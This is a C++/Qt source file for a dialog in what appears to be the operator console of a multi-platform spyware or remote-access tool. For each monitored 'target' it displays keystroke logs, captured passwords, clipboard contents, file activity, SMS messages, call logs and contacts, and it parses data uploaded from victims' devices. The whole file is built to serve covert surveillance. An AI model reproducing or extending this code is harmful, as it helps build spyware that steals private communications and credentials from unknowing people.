#include "useractiondlg.h"
#include "target.h"
#include "DatabaseManager.h"
#include "waitdlg.h"
#include "nofocusstyle.h"

#include <QtGui>

UserActionDlg::UserActionDlg(QWidget *parent, Target* tar)
	: QWidget(parent)
	, m_tar(tar)
	, m_waitKeyboardInfoDlg(NULL)
	, m_queryKeyboardInfoFinished(false)
{
	ui.setupUi(this);

	// 检测用
	//if ( SYSTEM_ANDROID == GetSystemType(this->m_tar->dwOsBuildNumber) )
	//{
	//	ui.trUserAction->topLevelItem(1)->setHidden(true);
	//}

	InitWidgetAppearance();
	InitConnection();
	InitUserAction();

	// 定时刷新数据 -> 5 分钟
	//m_refreshTimer.start(1000*60*5);

	// 用户文件操作类型
	strcpy(opType, "全部操作");

	ui.title->hide();
	ui.label_3->hide();
	ui.label_4->hide();
	ui.label_5->hide();
	ui.label_11->hide();

}

UserActionDlg::~UserActionDlg()
{

}

void UserActionDlg::InitUserAction()
{
	// 不同操作系统左侧的列表不一样
	//
	if ( SYSTEM_WINDOWS == GetSystemType(m_tar->dwOsBuildNumber) )
	{
		// windows
		ui.trUserAction->takeTopLevelItem(3);

		// 审查用
		//ui.trUserAction->takeTopLevelItem(1);

	}
	else if ( SYSTEM_MACOSX == GetSystemType(this->m_tar->dwOsBuildNumber) )
	{
		// Mac
		ui.trUserAction->takeTopLevelItem(0);
		ui.trUserAction->takeTopLevelItem(1);
		ui.trUserAction->takeTopLevelItem(1);

		QTreeWidgetItem* userAction = ui.trUserAction->topLevelItem(0);
		userAction->takeChild(1);
		userAction->takeChild(1);

		// 只有键盘记录一项
		ui.stkUserAction->setCurrentIndex(1);
	}
	else if ( SYSTEM_IOS == GetSystemType(this->m_tar->dwOsBuildNumber) )
	{
		// IOS
		ui.trUserAction->takeTopLevelItem(0);
		ui.trUserAction->takeTopLevelItem(1);

		QTreeWidgetItem* userAction = ui.trUserAction->topLevelItem(0);
		userAction->takeChild(1);
		userAction->takeChild(1);

		userAction = ui.trUserAction->topLevelItem(1);
		userAction->takeChild(2);

		ui.stkUserAction->setCurrentIndex(1);
	}
	else
	{
		// Android
		ui.trUserAction->takeTopLevelItem(0);
		ui.trUserAction->takeTopLevelItem(1);

		QTreeWidgetItem* userAction = ui.trUserAction->topLevelItem(0);
		userAction->takeChild(1);
		userAction->takeChild(1);

		ui.stkUserAction->setCurrentIndex(1);
	}

	// 展开
	for (int i = 0; i < ui.trUserAction->topLevelItemCount(); i++)
	{
		ui.trUserAction->topLevelItem(i)->setExpanded(true);
	}

	InitUserActionData();
}

void UserActionDlg::InitConnection()
{
	// 定时器，刷新用户行为监控的数据
	connect(&m_refreshTimer, SIGNAL(timeout()), this, SLOT(RefreshUserActionData()));

	// 刷新数据
	connect(ui.btnRefreshData, SIGNAL(clicked()), this, SLOT(RefreshUserActionData()));

	// 查询键盘记录
	connect(this, SIGNAL(emitKeyboardInfo(unsigned int, PageTableWidget*)), DM, SLOT(QueryIMEData(unsigned int, PageTableWidget*)));

	// 查询完毕
	connect(DM, SIGNAL(emitKeyboardInfoFinished(unsigned int)), this, SLOT(onQueryKeyboardInfoFinished(unsigned int)));

	// 点击左侧树形列表某一项
	connect(ui.trUserAction, SIGNAL(itemClicked(QTreeWidgetItem*, int)), this, SLOT(onTrUserActionItemClicked(QTreeWidgetItem*, int)));

	// 点击用户键盘记录某一项
	connect(ui.tbKeyboardRecord, SIGNAL(itemClicked(QTableWidgetItem*)), this, SLOT(onTbKeyboardRecordItemClicked(QTableWidgetItem*)));

	// 点击用户密码记录某一项
	connect(ui.tbPasswordRecord, SIGNAL(itemClicked(QTableWidgetItem*)), this, SLOT(onTbPasswordRecordItemClicked(QTableWidgetItem*)));

	// 点击剪贴板记录某一项
	connect(ui.tbClipboardData, SIGNAL(itemClicked(QTableWidgetItem*)), this, SLOT(onTbClipboardDataItemClicked(QTableWidgetItem*)));

	// 点击短信记录某一项
	connect(ui.tbMessageInfo, SIGNAL(itemClicked(QTableWidgetItem*)), this, SLOT(onTbMessageInfoItemClicked(QTableWidgetItem*)));

	// 获取通话记录信息
	connect(this, SIGNAL(emitCallInfo(unsigned int, QTableWidget*)), DM, SLOT(QueryCALData(unsigned int, QTableWidget*)));
	connect(DM, SIGNAL(emitCalInfoFinished(bool)), ui.btnRefreshData, SLOT(setEnabled(bool)));

	// 重新获取短信和通话记录
	/*if ( SYSTEM_ANDROID == GetSystemType(this->m_tar->dwOsBuildNumber) )
	{
		QAction* actReget = ui.btnRefreshData->actions().at(0);
		connect(actReget, SIGNAL(triggered()), this, SLOT(UpdatePhoneRecord()));
	}*/
}

void UserActionDlg::InitWidgetAppearance()
{
	NoFocusStyle* nofocusStyle = new NoFocusStyle(this);
	ui.trUserAction->setStyle(nofocusStyle);

	// 文件操作
	ui.tbUserFileAction->setStyle(nofocusStyle);
	ui.tbUserFileAction->horizontalHeader()->resizeSection(0, 130);
	ui.tbUserFileAction->horizontalHeader()->resizeSection(1, 60);
	ui.tbUserFileAction->horizontalHeader()->resizeSection(2, 300);

	// 键盘记录
	ui.tbKeyboardRecord->SetRowCountPerPage(50);
	ui.tbKeyboardRecord->SetColumnCount(5);
	QStringList headers;
	headers << QString::fromLocal8Bit("时间") << QString::fromLocal8Bit("进程 ID")
		<< QString::fromLocal8Bit("进程名") << QString::fromLocal8Bit("窗口标题") << QString::fromLocal8Bit("内容");
	ui.tbKeyboardRecord->SetColumnLabels(headers);
	ui.tbKeyboardRecord->RefreshPage();

	if ( MobileDevice(m_tar) )
		ui.tbKeyboardRecord->SetColumnHidden(3, true);

	ui.tbKeyboardRecord->setStyle(nofocusStyle);
	ui.tbKeyboardRecord->horizontalHeader()->resizeSection(0, 130);
	ui.tbKeyboardRecord->horizontalHeader()->resizeSection(1, 60);
	ui.tbKeyboardRecord->horizontalHeader()->resizeSection(2, 100);
	ui.tbKeyboardRecord->horizontalHeader()->resizeSection(3, 200);

	// 密码
	ui.tbPasswordRecord->setStyle(nofocusStyle);
	ui.tbPasswordRecord->horizontalHeader()->resizeSection(0, 130);
	ui.tbPasswordRecord->horizontalHeader()->resizeSection(1, 60);
	ui.tbPasswordRecord->horizontalHeader()->resizeSection(2, 100);

	// 剪贴板
	ui.tbClipboardData->setStyle(nofocusStyle);
	ui.tbClipboardData->horizontalHeader()->resizeSection(0, 130);
	ui.tbClipboardData->horizontalHeader()->resizeSection(1, 60);
	ui.tbClipboardData->horizontalHeader()->resizeSection(2, 100);

	// 文件访问
	ui.tbFileAccessRecord->setStyle(nofocusStyle);
	ui.tbFileAccessRecord->horizontalHeader()->resizeSection(0, 130);
	ui.tbFileAccessRecord->horizontalHeader()->resizeSection(1, 60);
	ui.tbFileAccessRecord->horizontalHeader()->resizeSection(2, 100);
	ui.tbFileAccessRecord->horizontalHeader()->resizeSection(3, 60);
	ui.tbFileAccessRecord->horizontalHeader()->resizeSection(4, 200);

	ui.tbCallInfo->setStyle(nofocusStyle);
	ui.tbMessageInfo->setStyle(nofocusStyle);
	ui.tbCommandRecord->setStyle(nofocusStyle);
	ui.tbAddressBook->setStyle(nofocusStyle);

	// 短信
	ui.tbMessageInfo->horizontalHeader()->resizeSection(3, 300);

	// 通话记录
	ui.tbCallInfo->horizontalHeader()->resizeSection(1, 50);
	ui.tbCallInfo->horizontalHeader()->resizeSection(5, 60);

	// 通讯录
	ui.tbAddressBook->horizontalHeader()->resizeSection(0, 100);
	ui.tbAddressBook->horizontalHeader()->resizeSection(1, 150);
	ui.tbAddressBook->horizontalHeader()->resizeSection(2, 100);
	ui.tbAddressBook->horizontalHeader()->resizeSection(3, 100);
	ui.tbAddressBook->horizontalHeader()->resizeSection(4, 300);

	// 高级功能
	/*if ( SYSTEM_ANDROID == GetSystemType(this->m_tar->dwOsBuildNumber) )
	{
		ui.btnRefreshData->setPopupMode(QToolButton::MenuButtonPopup);
		ui.btnRefreshData->setFixedSize(40, 22);
		ui.btnRefreshData->addAction(new QAction(QString::fromLocal8Bit("重新获取短信和通话记录"), this));
	}*/
}

void UserActionDlg::onTrUserActionItemClicked(QTreeWidgetItem* item, int column)
{

	std::wstring text = item->text(0).toStdWString();

	std::map<std::wstring, int> indexMap;

	//indexMap[L"用户文件行为"] = 0;
	indexMap[L"全部操作"] = 0;
	indexMap[L"新建文件"] = 0;
	indexMap[L"删除文件"] = 0;
	indexMap[L"拷贝文件"] = 0;
	indexMap[L"移动文件"] = 0;
	indexMap[L"新建目录"] = 0;
	indexMap[L"删除目录"] = 0;
	//indexMap[L"用户敏感行为"] = 1;
	indexMap[L"键盘记录"] = 1;
	indexMap[L"密码窗口感知"] = 2;
	indexMap[L"剪切板监控"] = 3;
	//indexMap[L"进程行为"] = 4;
	indexMap[L"文件访问"] = 4;
	indexMap[L"执行轨迹"] = 5;
	//indexMap[L"通讯行为"] = 6;
	indexMap[L"短信记录"] = 6;
	indexMap[L"通话记录"] = 7;
	indexMap[L"通讯录"] = 8;

	strcpy(opType, WideToAnsi(text).c_str());

	if ( indexMap.end() != indexMap.find(text) )
	{
		int index = indexMap[text];
		ui.stkUserAction->setCurrentIndex(index);
		ui.lbUserAction->setText(item->parent()->text(0) + " - " + item->text(0));

		if ( index == 0 )
			RefreshUserFOIData();

		if ( index == 1 && !m_queryKeyboardInfoFinished
			&& NULL == m_waitKeyboardInfoDlg )
		{
			m_waitKeyboardInfoDlg = new WaitDlg(ui.tbKeyboardRecord);
			m_waitKeyboardInfoDlg->show();
			RefreshIMEData();
		}

		if ( index == 2 && 0 == ui.tbPasswordRecord->rowCount() )
			RefreshPWIData();

		if ( index == 3 && 0 == ui.tbClipboardData->rowCount() )
			RefreshCBDData();

		if ( index == 4 && 0 == ui.tbFileAccessRecord->rowCount() )
			RefreshFOIData();

		if ( index == 5 && 0 == ui.tbCommandRecord->rowCount() )
			RefreshPEIData();

		if ( index == 6 && 0 == ui.tbMessageInfo->rowCount() )
			RefreshSMSData();

		if ( index == 7 && 0 == ui.tbCallInfo->rowCount() )
			RefreshCALData();

		if ( index == 8 && 0 == ui.tbAddressBook->rowCount() )
			RefreshCONTACTData();
	}
}

void UserActionDlg::onTbKeyboardRecordItemClicked(QTableWidgetItem* item)
{

	// 获取同一行的内容项
	QTableWidgetItem* content = ui.tbKeyboardRecord->item(item->row(), 4);

	if ( NULL != content )
	{
		ui.edtKeyboardRecordDetail->setText(content->text());
	}

}

void UserActionDlg::onTbPasswordRecordItemClicked(QTableWidgetItem* item)
{

	// 获取同一行的第一项
	QTableWidgetItem* content = ui.tbPasswordRecord->item(item->row(), 0);

	ui.edtPasswordDetail->setText(content->data(Qt::UserRole).toString());

}

void UserActionDlg::onTbClipboardDataItemClicked(QTableWidgetItem* item)
{

	// 获取同一行的内容项
	QTableWidgetItem* content = ui.tbClipboardData->item(item->row(), 3);

	ui.edtClipboardDataDetail->setText(content->text());

}

void UserActionDlg::onTbMessageInfoItemClicked(QTableWidgetItem* item)
{
	// 获取同一行的内容项
	QTableWidgetItem* content = ui.tbMessageInfo->item(item->row(), 3);

	ui.edtMessageInfoDetail->setText(content->text());
}

void UserActionDlg::InitUserActionData()
{
	QTreeWidgetItem* item = ui.trUserAction->topLevelItem(0)->child(0);
	onTrUserActionItemClicked(item, 0);
}

void UserActionDlg::RefreshUserFOIData()
{
	ui.tbUserFileAction->clearContents();
	ui.tbUserFileAction->setRowCount(0);

	DM->QueryUserFOIData(this->m_tar->dwTargetID, opType, ui.tbUserFileAction);
}

void UserActionDlg::RefreshIMEData()
{
	ui.tbKeyboardRecord->Clear();

	//DM->QueryIMEData(this->m_tar->dwTargetID, ui.tbKeyboardRecord);
	emitKeyboardInfo(m_tar->dwTargetID, ui.tbKeyboardRecord);
}

void UserActionDlg::RefreshPWIData()
{
	ui.tbPasswordRecord->clearContents();
	ui.tbPasswordRecord->setRowCount(0);

	DM->QueryPWIData(this->m_tar->dwTargetID, ui.tbPasswordRecord);
}

void UserActionDlg::RefreshCBDData()
{
	ui.tbClipboardData->clearContents();
	ui.tbClipboardData->setRowCount(0);

	DM->QueryCBDData(this->m_tar->dwTargetID, ui.tbClipboardData);
}

void UserActionDlg::RefreshFOIData()
{
	ui.tbFileAccessRecord->clearContents();
	ui.tbFileAccessRecord->setRowCount(0);

	DM->QueryFOIData(this->m_tar->dwTargetID, ui.tbFileAccessRecord);
}

void UserActionDlg::RefreshPEIData()
{
	ui.tbCommandRecord->clearContents();
	ui.tbCommandRecord->setRowCount(0);

	DM->QueryPEIData(this->m_tar->dwTargetID, ui.tbCommandRecord);
}

void UserActionDlg::RefreshSMSData()
{
	ui.tbMessageInfo->clearContents();
	ui.tbMessageInfo->setRowCount(0);

	DM->QuerySMSData(this->m_tar->dwTargetID, ui.tbMessageInfo);
}

void UserActionDlg::RefreshCALData()
{
	ui.tbCallInfo->clearContents();
	ui.tbCallInfo->setRowCount(0);

	DM->QueryCALData(this->m_tar->dwTargetID, ui.tbCallInfo);
	//emitCallInfo(this->m_tar->dwTargetID, ui.tbCallInfo);
}

void UserActionDlg::RefreshCONTACTData()
{
	ui.tbAddressBook->clearContents();
	ui.tbAddressBook->setRowCount(0);

	//DM->QueryCALData(this->m_tar->dwTargetID, ui.tbCallInfo);
	DM->QueryCONTACTData(this->m_tar->dwTargetID, ui.tbAddressBook);
}

void UserActionDlg::onQueryKeyboardInfoFinished(unsigned int tarId)
{
	if ( tarId != m_tar->dwTargetID )
		return;

	if ( m_waitKeyboardInfoDlg )
	{
		m_waitKeyboardInfoDlg->close();
		delete m_waitKeyboardInfoDlg;
		m_waitKeyboardInfoDlg = NULL;
	}

	m_queryKeyboardInfoFinished = true;

	ui.btnRefreshData->setEnabled(true);
}

void UserActionDlg::RefreshUserActionData()
{
	int nRefresh = 0;

	if ( !FrmMain->ctrOnlineFlag )
	{
		return;
	}
	
	if ( this->m_tar->tarStatus == TAROFFLINE )
		return;

	ui.btnRefreshData->setEnabled(false);

	switch ( ui.stkUserAction->currentIndex() )
	{
	case 0:
		this->RefreshUserFOIData();
		ui.btnRefreshData->setEnabled(true);
		break;
	case 1:
		if ( NULL == m_waitKeyboardInfoDlg )
		{
			m_queryKeyboardInfoFinished = false;
			m_waitKeyboardInfoDlg = new WaitDlg(ui.tbKeyboardRecord);
			m_waitKeyboardInfoDlg->show();
			this->RefreshIMEData();
		}
		break;
	case 2:
		this->RefreshPWIData();
		ui.btnRefreshData->setEnabled(true);
		break;
	case 3:
		this->RefreshCBDData();
		ui.btnRefreshData->setEnabled(true);
		break;
	case 4:
		this->RefreshFOIData();
		ui.btnRefreshData->setEnabled(true);
		break;
	case 5:
		this->RefreshPEIData();
		ui.btnRefreshData->setEnabled(true);
		break;

	case 6:
		this->RefreshSMSData();
		ui.btnRefreshData->setEnabled(true);
		break;

	case 7:
		this->RefreshCALData();
		ui.btnRefreshData->setEnabled(true);
		break;

	case 8:
		this->RefreshCONTACTData();
		ui.btnRefreshData->setEnabled(true);
		break;
	}

}

void UserActionDlg::GetNewPluginData( MSG* msg )
{
	PDATA_BLOCK dataBlock = (PDATA_BLOCK)(msg->lParam);
	const wchar_t* dataType = (const wchar_t*)(msg->wParam);

	std::vector<std::string> & args = dataBlock->args;


	if ( 0 == wcscmp(dataType, L"IME") )
	{
		LONG time = strtoul(args[2].c_str(), NULL, 10);
		std::string procNameBase64 = args[3].c_str();
		DWORD procId = strtoul(args[4].c_str(), NULL, 10);
		std::string captionBase64 = args[5].c_str();
		std::wstring  content = std::wstring((PWCHAR)dataBlock->data.c_str(), dataBlock->dataLen / sizeof(WCHAR));

		InsertIMEData(
			time, 
			GetWideFromBase64(procNameBase64), 
			procId, 
			GetWideFromBase64(captionBase64),
			content);
	}

	if ( 0 == wcscmp(dataType, L"SMS") )
	{
		LONG type = strtoul(args[2].c_str(),NULL,10);
		std::string addressBase64 = args[3].c_str();
		std::string messageBase64 = args[4].c_str();
		std::string date = args[5].c_str();

		InsertSMSData(
			type,
			GetWideFromBase64(addressBase64),
			GetWideFromBase64(messageBase64),
			GetWideFromBase64(date));
	}

	if ( 0 == wcscmp(dataType, L"CAL") )
	{
		LONG type = strtoul(args[2].c_str(),NULL,10);
		std::string addressBase64 = args[3].c_str();
		std::string date = args[5].c_str();
		LONG duration = strtoul(args[6].c_str(), NULL, 0);

		InsertCALData(
			type,
			GetWideFromBase64(addressBase64),
			GetWideFromBase64(date),
			duration);
	}

	if ( 0 == wcscmp(dataType, L"CONTACT") )
	{
		std::string nameBase64 = args[2].c_str();
		std::string phoneBase64 = args[3].c_str();
		std::string remarkBase64;

		if ( args.size() > 4 )
			remarkBase64 = args[4].c_str();
		else
			remarkBase64 = "";

		InsertCONTACTData(
			GetWideFromBase64(nameBase64),
			GetWideFromBase64(phoneBase64),
			GetWideFromBase64(remarkBase64));
	}
}

void UserActionDlg::InsertIMEData(
	LONG time, 
	const std::wstring& proc, 
	int procId, 
	const std::wstring& caption, 
	const std::wstring& content)
{
	PageTableWidget* table = ui.tbKeyboardRecord;

	QTableWidgetItem* timeItem = new QTableWidgetItem;
	QTableWidgetItem* processId = new QTableWidgetItem;
	QTableWidgetItem* processName = new QTableWidgetItem;
	QTableWidgetItem* title = new QTableWidgetItem;
	QTableWidgetItem* contentItem = new QTableWidgetItem;

	timeItem->setTextAlignment(Qt::AlignCenter);
	processId->setTextAlignment(Qt::AlignCenter);
	processName->setTextAlignment(Qt::AlignCenter);
	title->setTextAlignment(Qt::AlignCenter);

	timeItem->setText(GetTimeString(time).c_str());
	processId->setText(QString("%1").arg(procId));
	processName->setText(QString::fromStdWString(proc));
	title->setText(QString::fromStdWString(caption));
	contentItem->setText(QString::fromStdWString(content));

	table->AppendRow();
	table->SetAppendRowItem(0, timeItem);
	table->SetAppendRowItem(1, processId);
	table->SetAppendRowItem(2, processName);
	table->SetAppendRowItem(3, title);
	table->SetAppendRowItem(4, contentItem);

	table->RefreshPage();
}

void UserActionDlg::InsertSMSData(
	LONG type,
	const std::wstring& address,
	const std::wstring& msg,
	const std::wstring& date)
{
	QTableWidget* table = ui.tbMessageInfo;
	QTableWidgetItem* time = new QTableWidgetItem;
	time->setTextAlignment(Qt::AlignCenter);
	QTableWidgetItem* typeItem = new QTableWidgetItem;
	typeItem->setTextAlignment(Qt::AlignCenter);
	QTableWidgetItem* contact = new QTableWidgetItem;
	QTableWidgetItem* message = new QTableWidgetItem;
	QTableWidgetItem* getTime = new QTableWidgetItem;
	getTime->setTextAlignment(Qt::AlignCenter);

	time->setText(QString::fromStdWString(date));
	typeItem->setText(type == 1 ? 
		QString::fromLocal8Bit("发送") : QString::fromLocal8Bit("接收"));
	contact->setText(QString::fromStdWString(address));
	message->setText(QString::fromStdWString(msg));
	getTime->setText(QString::fromStdWString(AnsiToWide(TGetCurrentTime())));

	table->insertRow(0);
	table->setItem(0, 0, time);
	table->setItem(0, 1, typeItem);
	table->setItem(0, 2, contact);
	table->setItem(0, 3, message);
	table->setItem(0, 4, getTime);
}

void UserActionDlg::InsertCALData(
	LONG lType,
	const std::wstring& address,
	const std::wstring& date,
	int iDuration)
{
	QTableWidget* table = ui.tbCallInfo;

	QTableWidgetItem* time = new QTableWidgetItem;
	time->setTextAlignment(Qt::AlignCenter);
	QTableWidgetItem* type = new QTableWidgetItem;
	type->setTextAlignment(Qt::AlignCenter);
	QTableWidgetItem* contact = new QTableWidgetItem;
	contact->setTextAlignment(Qt::AlignCenter);
	QTableWidgetItem* location = new QTableWidgetItem;
	location->setTextAlignment(Qt::AlignCenter);
	QTableWidgetItem* network = new QTableWidgetItem;
	network->setTextAlignment(Qt::AlignCenter);
	QTableWidgetItem* duration = new QTableWidgetItem;
	duration->setTextAlignment(Qt::AlignCenter);

	QTableWidgetItem* getTime = new QTableWidgetItem;
	getTime->setTextAlignment(Qt::AlignCenter);

	time->setText(QString::fromStdWString(date));
	type->setText(lType ==  1 ? 
		QString::fromLocal8Bit("拨打") : QString::fromLocal8Bit("接听"));
	contact->setText(QString::fromStdWString(address));
	duration->setText(QString("%1").arg(iDuration) + QString::fromLocal8Bit(" 秒"));
	getTime->setText(TGetCurrentTime().c_str());

	std::wstring locationStr, netServiceStr;
	DM->GetLocationFromPhoneNumber(address, locationStr, netServiceStr);

	location->setText(QString::fromStdWString(locationStr));
	network->setText(QString::fromStdWString(netServiceStr));

	table->insertRow(0);
	table->setItem(0, 0, time);
	table->setItem(0, 1, type);
	table->setItem(0, 2, contact);
	table->setItem(0, 3, network);
	table->setItem(0, 4, location);
	table->setItem(0, 5, duration);
	table->setItem(0, 6, getTime);
}

void UserActionDlg::InsertCONTACTData(
	const std::wstring& name,
	const std::wstring& phone,
	const std::wstring& remark)
{
	QTableWidget* table = ui.tbAddressBook;
	QTableWidgetItem* nameItem = new QTableWidgetItem;
	QTableWidgetItem* phoneItem = new QTableWidgetItem;
	QTableWidgetItem* locationItem = new QTableWidgetItem;
	QTableWidgetItem* networkItem = new QTableWidgetItem;
	QTableWidgetItem* remarkItem = new QTableWidgetItem;
	QTableWidgetItem* getTimeItem = new QTableWidgetItem;
	getTimeItem->setTextAlignment(Qt::AlignCenter);

	nameItem->setText(QString::fromStdWString(name));
	phoneItem->setText(QString::fromStdWString(phone));
	remarkItem->setText(QString::fromStdWString(remark));
	getTimeItem->setText(TGetCurrentTime().c_str());

	std::wstring location, netService;
	DM->GetLocationFromPhoneNumber(phone, location, netService);
	locationItem->setText(QString::fromStdWString(location));
	networkItem->setText(QString::fromStdWString(netService));

	nameItem->setIcon(QIcon(QPixmap("image/group.png")));

	table->insertRow(0);
	table->setItem(0, 0, nameItem);
	table->setItem(0, 1, phoneItem);
	table->setItem(0, 2, locationItem);
	table->setItem(0, 3, networkItem);
	table->setItem(0, 4, remarkItem);
	table->setItem(0, 5, getTimeItem);
}